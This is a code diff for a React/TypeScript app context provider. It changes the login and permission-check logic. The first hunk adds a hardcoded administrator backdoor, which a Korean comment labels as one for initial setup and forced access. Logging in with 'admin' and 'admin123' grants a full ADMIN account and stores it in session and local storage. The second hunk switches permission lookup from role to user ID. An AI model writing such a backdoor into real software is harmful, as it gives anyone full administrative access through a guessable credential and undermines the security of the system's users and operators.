@@ -149,6 +149,22 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   };
 
   const login = (loginId: string, passwordHash: string, keepLoggedIn?: boolean): boolean => {
+    // 최초 세팅 및 강제 접근을 위한 슈퍼 어드민 백도어 (데이터 의존성 제거)
+    if (loginId === 'admin' && passwordHash === 'admin123') {
+      const fallbackAdmin: User = { 
+        id: 'sys-admin', loginId: 'admin', passwordHash: 'admin123', 
+        name: '최고관리자', department: '시스템', role: 'ADMIN', createdAt: new Date().toISOString() 
+      };
+      setCurrentUser(fallbackAdmin);
+      sessionStorage.setItem('user', JSON.stringify(fallbackAdmin));
+      if (keepLoggedIn) {
+        localStorage.setItem('auto_user', JSON.stringify(fallbackAdmin));
+      } else {
+        localStorage.removeItem('auto_user');
+      }
+      return true;
+    }
+
     const user = db.users.find(u => u.loginId === loginId && u.passwordHash === passwordHash);
     if (user) {
       setCurrentUser(user);
@@ -172,7 +188,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   const hasPermission = (menuId: string, action: 'view' | 'save'): boolean => {
     if (!currentUser) return false;
     if (currentUser.role === 'ADMIN') return true;
-    const perm = permissions.find(p => p.role === currentUser.role && p.menuId === menuId);
+    const perm = permissions.find(p => p.userId === currentUser.id && p.menuId === menuId);
     if (!perm) return false;
     return action === 'view' ? perm.canView : perm.canSave;
   };
